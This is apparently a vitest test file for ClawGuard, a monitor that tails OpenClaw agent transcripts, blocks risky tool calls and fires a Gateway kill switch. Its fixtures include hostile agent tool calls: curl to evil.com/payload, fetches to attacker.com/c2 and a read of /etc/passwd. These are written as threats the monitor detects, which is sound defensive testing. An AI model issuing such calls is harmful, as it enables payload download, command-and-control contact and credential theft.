/**
 * OpenClaw Integration Tests — Tailer + Gateway Kill Switch
 *
 * Tests the session transcript tailer and Gateway kill switch connector
 * without requiring a running OpenClaw instance.
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { mkdtempSync, rmSync, mkdirSync, writeFileSync, appendFileSync } from 'fs';
import { join } from 'path';
import { tmpdir } from 'os';
import { SessionGraph, EventBus, createEvent } from '@clawstack/shared';
import type { BusEvent } from '@clawstack/shared';
import {
  OpenClawTailer,
  OpenClawKillSwitch,
} from '@clawstack/clawguard';
import type {
  TailerEvent,
  GatewaySocket,
} from '@clawstack/clawguard';

// ─── Test Helpers ───────────────────────────────────────────────────

let tmpDir: string;
let sessionsDir: string;
let graph: SessionGraph;
let bus: EventBus;
let agentId: string;
let sessionId: string;

function setup() {
  tmpDir = mkdtempSync(join(tmpdir(), 'openclaw-test-'));
  sessionsDir = join(tmpDir, 'sessions');
  mkdirSync(sessionsDir, { recursive: true });

  graph = new SessionGraph(join(tmpDir, 'test.db'));
  bus = new EventBus();

  const agent = graph.registerAgent({
    name: 'blade',
    platform: 'openclaw',
    version: '2026.2.24',
    dockerSandboxed: true,
    metadata: { model: 'grok-4-1-fast-reasoning' },
  });
  agentId = agent.agentId;

  const session = graph.startSession(agentId);
  sessionId = session.sessionId;
}

function cleanup() {
  graph.close();
  rmSync(tmpDir, { recursive: true, force: true });
}

/** Build an OpenClaw-format JSONL line for an assistant message with tool calls */
function makeToolCallEntry(id: string, toolName: string, args: Record<string, unknown>, usage?: { totalTokens: number }): string {
  return JSON.stringify({
    type: 'message',
    id,
    parentId: null,
    timestamp: new Date().toISOString(),
    message: {
      role: 'assistant',
      content: [
        { type: 'text', text: '' },
        { type: 'toolCall', id: `toolu_${id}`, name: toolName, arguments: args },
      ],
      model: 'grok-4-1-fast-reasoning',
      provider: 'xai',
      usage: usage ?? { input: 1000, output: 100, totalTokens: 1100, cost: { total: 0.01 } },
    },
  });
}

/** Build an OpenClaw session header */
function makeSessionHeader(id: string): string {
  return JSON.stringify({
    type: 'session',
    version: 3,
    id,
    timestamp: new Date().toISOString(),
    cwd: '/Users/test/.openclaw/workspace',
  });
}

/** Build a user message line */
function makeUserMessage(id: string, text: string): string {
  return JSON.stringify({
    type: 'message',
    id,
    parentId: null,
    timestamp: new Date().toISOString(),
    message: {
      role: 'user',
      content: [{ type: 'text', text }],
    },
  });
}

/** Build a tool result line */
function makeToolResult(id: string, toolName: string, toolCallId: string, result: string): string {
  return JSON.stringify({
    type: 'message',
    id,
    parentId: null,
    timestamp: new Date().toISOString(),
    message: {
      role: 'toolResult',
      toolCallId,
      toolName,
      content: [{ type: 'text', text: result }],
      isError: false,
    },
  });
}

// ─── Mock Gateway Socket ────────────────────────────────────────────

function createMockSocket(): GatewaySocket & { sent: string[]; triggerOpen: () => void; triggerMessage: (data: string) => void; triggerClose: () => void } {
  const mock: GatewaySocket & { sent: string[]; triggerOpen: () => void; triggerMessage: (data: string) => void; triggerClose: () => void } = {
    sent: [],
    readyState: 1,
    onopen: null,
    onmessage: null,
    onclose: null,
    onerror: null,
    send(data: string) { this.sent.push(data); },
    close() { this.onclose?.({}); },
    triggerOpen() { this.onopen?.({}); },
    triggerMessage(data: string) { this.onmessage?.({ data }); },
    triggerClose() { this.onclose?.({}); },
  };
  return mock;
}

// ─── OpenClawTailer Tests ───────────────────────────────────────────

describe('OpenClawTailer', () => {
  beforeEach(setup);
  afterEach(cleanup);

  it('processes exec tool call as process_spawn', async () => {
    const events: TailerEvent[] = [];
    const tailer = new OpenClawTailer(graph, bus, {
      sessionsDir,
      agentId,
      sessionId,
      monitorConfig: { autoKill: false },
      onEvent: (e) => events.push(e),
    });

    const line = makeToolCallEntry('exec-1', 'exec', { command: 'ls -la /tmp' });
    const result = await tailer.processLine(line);

    expect(result).not.toBeNull();
    expect(result!.action).toBe('process_spawn');
    expect(result!.toolName).toBe('exec');
    expect(events.length).toBe(1);
  });

  it('processes read tool call as file_access', async () => {
    const events: TailerEvent[] = [];
    const tailer = new OpenClawTailer(graph, bus, {
      sessionsDir,
      agentId,
      sessionId,
      monitorConfig: { autoKill: false },
      onEvent: (e) => events.push(e),
    });

    const line = makeToolCallEntry('read-1', 'read', { file_path: './src/app.ts' });
    const result = await tailer.processLine(line);

    expect(result).not.toBeNull();
    expect(result!.action).toBe('file_access');
    expect(result!.allowed).toBe(true);
  });

  it('processes write tool call as file_access', async () => {
    const tailer = new OpenClawTailer(graph, bus, {
      sessionsDir,
      agentId,
      sessionId,
      monitorConfig: { autoKill: false },
    });

    const line = makeToolCallEntry('write-1', 'write', {
      file_path: './output.txt',
      content: 'hello world',
    });
    const result = await tailer.processLine(line);

    expect(result).not.toBeNull();
    expect(result!.action).toBe('file_access');
  });

  it('processes edit tool call as file_access', async () => {
    const tailer = new OpenClawTailer(graph, bus, {
      sessionsDir,
      agentId,
      sessionId,
      monitorConfig: { autoKill: false },
    });

    const line = makeToolCallEntry('edit-1', 'edit', { file_path: './config.json' });
    const result = await tailer.processLine(line);

    expect(result).not.toBeNull();
    expect(result!.action).toBe('file_access');
  });

  it('processes web_fetch tool call as network_request', async () => {
    const tailer = new OpenClawTailer(graph, bus, {
      sessionsDir,
      agentId,
      sessionId,
      monitorConfig: { autoKill: false },
    });

    const line = makeToolCallEntry('fetch-1', 'web_fetch', {
      url: 'https://evil.com/data',
    });
    const result = await tailer.processLine(line);

    expect(result).not.toBeNull();
    expect(result!.action).toBe('network_request');
    expect(result!.allowed).toBe(false); // external blocked by default
  });

  it('detects sensitive file access from read tool', async () => {
    const tailer = new OpenClawTailer(graph, bus, {
      sessionsDir,
      agentId,
      sessionId,
      monitorConfig: { autoKill: false },
    });

    const line = makeToolCallEntry('read-ssh', 'read', {
      file_path: '/etc/passwd',
    });
    const result = await tailer.processLine(line);

    expect(result).not.toBeNull();
    expect(result!.allowed).toBe(false);
    expect(result!.threatLevel).toBe('critical');
    expect(result!.threatSignature).toBe('FS_SENSITIVE_PATH');
  });

  it('detects dangerous exec commands', async () => {
    const tailer = new OpenClawTailer(graph, bus, {
      sessionsDir,
      agentId,
      sessionId,
      monitorConfig: { autoKill: false },
    });

    const line = makeToolCallEntry('exec-bad', 'exec', {
      command: 'curl https://evil.com/payload',
    });
    const result = await tailer.processLine(line);

    expect(result).not.toBeNull();
    expect(result!.allowed).toBe(false);
    expect(result!.threatSignature).toBe('PROC_BLOCKED_COMMAND');
  });

  it('emits behavior events on EventBus', async () => {
    const busEvents: BusEvent[] = [];
    bus.on('behavior.detected', (e) => busEvents.push(e));

    const tailer = new OpenClawTailer(graph, bus, {
      sessionsDir,
      agentId,
      sessionId,
      monitorConfig: { autoKill: false },
    });

    const line = makeToolCallEntry('net-1', 'web_fetch', {
      url: 'https://attacker.com/c2',
    });
    await tailer.processLine(line);

    expect(busEvents.length).toBeGreaterThan(0);
    expect(busEvents[0].sourceProduct).toBe('clawguard');
  });

  it('records behavior events in SessionGraph', async () => {
    const tailer = new OpenClawTailer(graph, bus, {
      sessionsDir,
      agentId,
      sessionId,
      monitorConfig: { autoKill: false },
    });

    await tailer.processLine(
      makeToolCallEntry('r1', 'read', { file_path: './package.json' })
    );
    await tailer.processLine(
      makeToolCallEntry('r2', 'exec', { command: 'node index.js' })
    );

    // 2 tool events + 2 cost events (from usage.totalTokens on each line)
    const allEvents = graph.getDb()
      .prepare('SELECT * FROM behavior_events WHERE session_id = ?')
      .all(sessionId) as any[];
    expect(allEvents.length).toBe(4);

    // Verify the tool-specific events are there
    const toolEvents = allEvents.filter((e: any) => {
      const details = JSON.parse(e.details);
      return details.type !== 'cost_anomaly';
    });
    expect(toolEvents.length).toBe(2);
  });

  it('ignores non-message JSONL entries', async () => {
    const tailer = new OpenClawTailer(graph, bus, {
      sessionsDir,
      agentId,
      sessionId,
    });

    const sessionHeader = makeSessionHeader('test-session-id');
    const result1 = await tailer.processLine(sessionHeader);
    expect(result1).toBeNull();

    const userMsg = makeUserMessage('user-1', 'Hello!');
    const result2 = await tailer.processLine(userMsg);
    expect(result2).toBeNull();

    const toolResult = makeToolResult('tr-1', 'read', 'toolu_read-1', 'file contents');
    const result3 = await tailer.processLine(toolResult);
    expect(result3).toBeNull();
  });

  it('ignores invalid JSON lines', async () => {
    const tailer = new OpenClawTailer(graph, bus, {
      sessionsDir,
      agentId,
      sessionId,
    });

    const result = await tailer.processLine('not json at all {{{');
    expect(result).toBeNull();

    const result2 = await tailer.processLine('');
    expect(result2).toBeNull();
  });

  it('tracks processed event count', async () => {
    const tailer = new OpenClawTailer(graph, bus, {
      sessionsDir,
      agentId,
      sessionId,
      monitorConfig: { autoKill: false },
    });

    expect(tailer.getProcessedCount()).toBe(0);

    await tailer.processLine(
      makeToolCallEntry('c1', 'read', { file_path: './a.ts' })
    );
    await tailer.processLine(
      makeToolCallEntry('c2', 'read', { file_path: './b.ts' })
    );

    expect(tailer.getProcessedCount()).toBe(2);
  });

  it('handles cost events from usage data', async () => {
    const tailer = new OpenClawTailer(graph, bus, {
      sessionsDir,
      agentId,
      sessionId,
      monitorConfig: {
        autoKill: false,
        policy: {
          costAnomaly: { spikeThresholdMultiplier: 2, windowSizeMs: 60000, maxTokensPerMinute: 500000 },
        },
      },
    });

    // Send several normal-sized calls
    for (let i = 0; i < 3; i++) {
      await tailer.processLine(
        makeToolCallEntry(`cost-${i}`, 'read', { file_path: './a.ts' }, { totalTokens: 1000 })
      );
    }

    // Send a massive spike
    await tailer.processLine(
      makeToolCallEntry('cost-spike', 'read', { file_path: './b.ts' }, { totalTokens: 100000 })
    );

    // Cost anomaly should be recorded in the graph
    const allEvents = graph.getDb()
      .prepare("SELECT * FROM behavior_events WHERE session_id = ? AND details LIKE '%cost_anomaly%'")
      .all(sessionId) as any[];
    expect(allEvents.length).toBeGreaterThan(0);
  });

  // ─── File watching tests ────────────────────────────────────────

  it('starts and stops without error', () => {
    const tailer = new OpenClawTailer(graph, bus, {
      sessionsDir,
      agentId,
      sessionId,
    });

    tailer.start();
    expect(tailer.isRunning()).toBe(true);

    tailer.stop();
    expect(tailer.isRunning()).toBe(false);
  });

  it('throws on non-existent sessions directory', () => {
    const tailer = new OpenClawTailer(graph, bus, {
      sessionsDir: '/tmp/does-not-exist-' + Date.now(),
      agentId,
      sessionId,
    });

    expect(() => tailer.start()).toThrow('Sessions directory does not exist');
  });

  it('reads existing JSONL files on start', async () => {
    // Write a session file before starting
    const sessionFile = join(sessionsDir, 'test-session.jsonl');
    const lines = [
      makeSessionHeader('test-session'),
      makeToolCallEntry('t1', 'read', { file_path: './index.ts' }),
    ];
    writeFileSync(sessionFile, lines.join('\n') + '\n');

    const events: TailerEvent[] = [];
    const tailer = new OpenClawTailer(graph, bus, {
      sessionsDir,
      agentId,
      sessionId,
      monitorConfig: { autoKill: false },
      onEvent: (e) => events.push(e),
    });

    tailer.start();

    // Wait for async processing
    await new Promise(r => setTimeout(r, 100));

    tailer.stop();

    expect(events.length).toBeGreaterThan(0);
  });

  it('detects new lines appended to existing file', async () => {
    const sessionFile = join(sessionsDir, 'live-session.jsonl');
    writeFileSync(sessionFile, makeSessionHeader('live') + '\n');

    const events: TailerEvent[] = [];
    const tailer = new OpenClawTailer(graph, bus, {
      sessionsDir,
      agentId,
      sessionId,
      monitorConfig: { autoKill: false },
      onEvent: (e) => events.push(e),
    });

    tailer.start();
    await new Promise(r => setTimeout(r, 50));

    // Append a new tool call
    appendFileSync(sessionFile, makeToolCallEntry('live-1', 'exec', { command: 'node test.js' }) + '\n');

    // fs.watch needs a moment to fire
    await new Promise(r => setTimeout(r, 200));

    tailer.stop();

    expect(events.length).toBeGreaterThan(0);
  });

  it('exposes the RuntimeMonitor', () => {
    const tailer = new OpenClawTailer(graph, bus, {
      sessionsDir,
      agentId,
      sessionId,
    });

    const monitor = tailer.getMonitor();
    expect(monitor).toBeDefined();
    expect(monitor.getPolicyEngine()).toBeDefined();
  });
});

// ─── OpenClawKillSwitch Tests ───────────────────────────────────────

describe('OpenClawKillSwitch', () => {
  beforeEach(setup);
  afterEach(cleanup);

  it('connects using socket factory', async () => {
    const mockSocket = createMockSocket();
    const ks = new OpenClawKillSwitch(bus, { token: 'test-token', reconnect: false }, () => mockSocket);

    const connectPromise = ks.connect();
    mockSocket.triggerOpen();
    await connectPromise;

    expect(ks.getState()).toBe('connected');

    // Should have sent auth handshake
    expect(mockSocket.sent.length).toBe(1);
    const handshake = JSON.parse(mockSocket.sent[0]);
    expect(handshake.method).toBe('connect');
    expect(handshake.params.role).toBe('operator');
    expect(handshake.params.token).toBe('test-token');

    ks.disconnect();
  });

  it('transitions to authenticated on hello-ok', async () => {
    const states: string[] = [];
    const mockSocket = createMockSocket();
    const ks = new OpenClawKillSwitch(
      bus,
      { token: 'test-token', reconnect: false, onStateChange: (s) => states.push(s) },
      () => mockSocket
    );

    const connectPromise = ks.connect();
    mockSocket.triggerOpen();
    await connectPromise;

    mockSocket.triggerMessage(JSON.stringify({
      type: 'event',
      event: 'hello-ok',
      payload: { protocolVersion: 1 },
    }));

    expect(ks.getState()).toBe('authenticated');
    expect(states).toContain('connecting');
    expect(states).toContain('connected');
    expect(states).toContain('authenticated');

    ks.disconnect();
  });

  it('sends sessions.stop on kill switch event', async () => {
    const mockSocket = createMockSocket();
    const ks = new OpenClawKillSwitch(bus, { token: 'test', reconnect: false }, () => mockSocket);

    const connectPromise = ks.connect();
    mockSocket.triggerOpen();
    await connectPromise;

    // Clear the auth handshake from sent
    mockSocket.sent.length = 0;

    // Simulate a kill switch event on the EventBus
    const killPromise = new Promise<void>(resolve => {
      // Listen for the outgoing request
      const origSend = mockSocket.send.bind(mockSocket);
      mockSocket.send = (data: string) => {
        origSend(data);
        // Auto-respond with success
        const req = JSON.parse(data);
        if (req.method === 'sessions.stop') {
          mockSocket.triggerMessage(JSON.stringify({
            type: 'res',
            id: req.id,
            ok: true,
            payload: { stopped: true },
          }));
          resolve();
        }
      };
    });

    await bus.emit(createEvent('behavior.blocked', 'clawguard', {
      action: 'kill_switch',
      sessionId: 'openclaw-session-123',
      agentId: 'main',
      reason: 'Critical threat: data exfiltration',
    }));

    await killPromise;

    expect(mockSocket.sent.length).toBeGreaterThan(0);
    const stopReq = JSON.parse(mockSocket.sent[0]);
    expect(stopReq.method).toBe('sessions.stop');
    expect(stopReq.params.sessionKey).toBe('openclaw-session-123');
    expect(stopReq.params.reason).toContain('Critical threat');

    expect(ks.getKillCount()).toBe(1);

    ks.disconnect();
  });

  it('falls back to agent.stop if sessions.stop fails', async () => {
    const mockSocket = createMockSocket();
    const ks = new OpenClawKillSwitch(bus, { token: 'test', reconnect: false }, () => mockSocket);

    const connectPromise = ks.connect();
    mockSocket.triggerOpen();
    await connectPromise;

    // Intercept and auto-respond to requests
    const origSend = mockSocket.send.bind(mockSocket);
    mockSocket.send = (data: string) => {
      origSend(data);
      const req = JSON.parse(data);
      if (req.method === 'sessions.stop') {
        mockSocket.triggerMessage(JSON.stringify({
          type: 'res', id: req.id, ok: false,
          error: { code: 'NOT_FOUND', message: 'Session not found' },
        }));
      } else if (req.method === 'agent.stop') {
        mockSocket.triggerMessage(JSON.stringify({
          type: 'res', id: req.id, ok: true, payload: {},
        }));
      }
    };

    const result = await ks.terminateSession('unknown-session', 'main', 'test kill');

    expect(result.success).toBe(true);
    expect(result.method).toBe('agent.stop');

    ks.disconnect();
  });

  it('returns failure when both methods fail', async () => {
    const mockSocket = createMockSocket();
    const ks = new OpenClawKillSwitch(bus, { token: 'test', reconnect: false }, () => mockSocket);

    const connectPromise = ks.connect();
    mockSocket.triggerOpen();
    await connectPromise;

    const origSend = mockSocket.send.bind(mockSocket);
    mockSocket.send = (data: string) => {
      origSend(data);
      const req = JSON.parse(data);
      mockSocket.triggerMessage(JSON.stringify({
        type: 'res', id: req.id, ok: false,
        error: { code: 'FAIL', message: 'Failed' },
      }));
    };

    const result = await ks.terminateSession('bad-session', 'main', 'test');

    expect(result.success).toBe(false);
    expect(result.error).toBeDefined();

    ks.disconnect();
  });

  it('returns error when not connected', async () => {
    const ks = new OpenClawKillSwitch(bus, { reconnect: false });

    const result = await ks.sendRequest('test', {});

    expect(result.ok).toBe(false);
    expect(result.error?.code).toBe('NOT_CONNECTED');
  });

  it('cleans up on disconnect', async () => {
    const mockSocket = createMockSocket();
    const ks = new OpenClawKillSwitch(bus, { token: 'test', reconnect: false }, () => mockSocket);

    const connectPromise = ks.connect();
    mockSocket.triggerOpen();
    await connectPromise;

    ks.disconnect();
    expect(ks.getState()).toBe('disconnected');
  });

  it('reports state transitions via callback', async () => {
    const states: string[] = [];
    const mockSocket = createMockSocket();
    const ks = new OpenClawKillSwitch(
      bus,
      {
        token: 'test',
        reconnect: false,
        onStateChange: (s) => states.push(s),
      },
      () => mockSocket
    );

    const connectPromise = ks.connect();
    mockSocket.triggerOpen();
    await connectPromise;

    ks.disconnect();

    expect(states).toEqual(['connecting', 'connected', 'disconnected']);
  });
});

// ─── End-to-End: Tailer + KillSwitch ─────────────────────────────────

describe('OpenClaw End-to-End Flow', () => {
  beforeEach(setup);
  afterEach(cleanup);

  it('tailer detects critical threat → kill switch fires → Gateway notified', async () => {
    const mockSocket = createMockSocket();
    let gatewayKilled = false;

    // Set up kill switch
    const ks = new OpenClawKillSwitch(bus, { token: 'test', reconnect: false }, () => mockSocket);
    const connectPromise = ks.connect();
    mockSocket.triggerOpen();
    await connectPromise;

    // Auto-respond to kill requests
    const origSend = mockSocket.send.bind(mockSocket);
    mockSocket.send = (data: string) => {
      origSend(data);
      const req = JSON.parse(data);
      if (req.method === 'sessions.stop' || req.method === 'agent.stop') {
        gatewayKilled = true;
        mockSocket.triggerMessage(JSON.stringify({
          type: 'res', id: req.id, ok: true, payload: {},
        }));
      }
    };

    // Set up tailer with autoKill enabled
    const tailerEvents: TailerEvent[] = [];
    const tailer = new OpenClawTailer(graph, bus, {
      sessionsDir,
      agentId,
      sessionId,
      monitorConfig: { autoKill: true },
      onEvent: (e) => tailerEvents.push(e),
    });

    // Feed a critical threat — read /etc/passwd
    await tailer.processLine(
      makeToolCallEntry('attack-1', 'read', { file_path: '/etc/passwd' })
    );

    // Give the async kill chain time to resolve
    await new Promise(r => setTimeout(r, 100));

    expect(tailerEvents.length).toBe(1);
    expect(tailerEvents[0].allowed).toBe(false);
    expect(tailerEvents[0].threatLevel).toBe('critical');

    // Kill switch should have fired through the EventBus
    expect(gatewayKilled).toBe(true);

    // Session should be terminated in the graph
    const sessions = graph.getActiveSessions(agentId);
    expect(sessions.length).toBe(0);

    ks.disconnect();
  });

  it('safe operations pass through without triggering kill switch', async () => {
    const tailer = new OpenClawTailer(graph, bus, {
      sessionsDir,
      agentId,
      sessionId,
      monitorConfig: { autoKill: true },
    });

    const busEvents: BusEvent[] = [];
    bus.on('behavior.blocked', (e) => busEvents.push(e));

    // Safe operations: read local file, run node
    await tailer.processLine(
      makeToolCallEntry('safe-1', 'read', { file_path: './src/index.ts' })
    );
    await tailer.processLine(
      makeToolCallEntry('safe-2', 'exec', { command: 'node server.js' })
    );

    // No blocked events
    const killEvents = busEvents.filter(
      e => (e.payload as any).action === 'kill_switch'
    );
    expect(killEvents.length).toBe(0);

    // Session still active
    const sessions = graph.getActiveSessions(agentId);
    expect(sessions.length).toBe(1);
  });
});
